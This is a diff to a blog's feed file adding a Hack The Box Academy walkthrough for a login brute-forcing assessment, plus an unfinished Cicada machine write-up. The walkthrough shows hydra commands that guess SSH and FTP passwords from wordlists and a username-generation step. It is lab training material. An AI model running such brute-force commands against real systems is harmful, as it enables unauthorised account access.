@@ -4,6 +4,72 @@
   
     
     <entry>
+      <title>HTB Academy - Login Brute Forcing Skill Assessment II  Walkthrough</title>
+      <link href="/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/"/>
+      <url>/2025/06/19/HTB%20Skill%20Assessment%20II%20Walkthrough/</url>
+      
+        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://academy.hackthebox.com/storage/modules/57/logo.png" alt="htblogo"></h2><p> The assessment’s objective is to  brute force  both SSH &amp; FTP servers on the target.<br> we start by gathering the  username for the SSH server   from skill Assessment I’s solution, which I’m not allowed to spoil.<br>lets start by brute forcing that user’s SSH password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l &lt;username&gt; -P &lt;2023-200_most_used_passwords.txt&gt; &lt;ip&gt; -s &lt;port&gt; ssh -t 3 -I</span><br></pre></td></tr></table></figure><p>SSH into target</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh &lt;user&gt;@83.136.253.201 -p &lt;port&gt;</span><br><span class="line">#prompt for pass:&lt;pass&gt;</span><br></pre></td></tr></table></figure><p>open incident report, There should be  a username hint<br><img src="/../images/bruting/namehint.png" alt="namehint"><br> use <code>username-anarchy</code> tool on the discovered user to generate a  list of possible ftp username combinations:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./username-anarchy/username-anarchy [FIRST] [LAST] &gt; tsmithNames.txt</span><br></pre></td></tr></table></figure><p>brute ftp with the newly generated username list and the provided password list on the target.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L &lt;unarchyLIST.txt&gt;.txt -P passwords.txt 127.0.0.1 ftp -t 3 -I</span><br></pre></td></tr></table></figure><p><img src="/../images/bruting/ftphydra.png" alt="ftphydra"><br>login to ftp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ftp ftp://&lt;USERNAME&gt;:&quot;&lt;PASS&gt;&quot;@localhost</span><br></pre></td></tr></table></figure><p>download the flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">ftp&gt; get flag.txt</span><br><span class="line">ftp&gt; exit</span><br><span class="line">sshSession$ cat flag.txt</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Writeup </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> bruteforcing </tag>
+            
+            <tag> brute </tag>
+            
+            <tag> hydra </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HackTheBox Cicada  Walkthrough</title>
+      <link href="/2025/01/22/HTB-SolarLab%20copy/"/>
+      <url>/2025/01/22/HTB-SolarLab%20copy/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/../images/solarlab/.png" alt="alt text"></p><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1> <span id="more"></span><hr><table><thead><tr><th>INFO</th><th></th></tr></thead><tbody><tr><td>CTF NAME</td><td><strong>Cicada</strong></td></tr><tr><td>Operating System</td><td><strong>Windows</strong></td></tr><tr><td>Diffculty</td><td><strong>Medium</strong></td></tr><tr><td>Retire date</td><td>21 Sep 2024</td></tr><tr><td>Points</td><td><strong>35</strong></td></tr></tbody></table><hr><h1 id="INFORMATION-GATHERING"><a href="#INFORMATION-GATHERING" class="headerlink" title="INFORMATION GATHERING"></a>INFORMATION GATHERING</h1><h1 id="ENUMERATION"><a href="#ENUMERATION" class="headerlink" title="ENUMERATION"></a>ENUMERATION</h1><p>En</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Writeup </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> HTB </tag>
+            
+            <tag> smb </tag>
+            
+            <tag> windows </tag>
+            
+            <tag> flask </tag>
+            
+            <tag> privilege escalation </tag>
+            
+            <tag> openfire </tag>
+            
+            <tag> chisel </tag>
+            
+            <tag> password-spray </tag>
+            
+            <tag> htb Cicada </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Privilege Escalation Blueprint</title>
       <link href="/2024/11/03/Privilege%20Escalation/"/>
       <url>/2024/11/03/Privilege%20Escalation/</url>
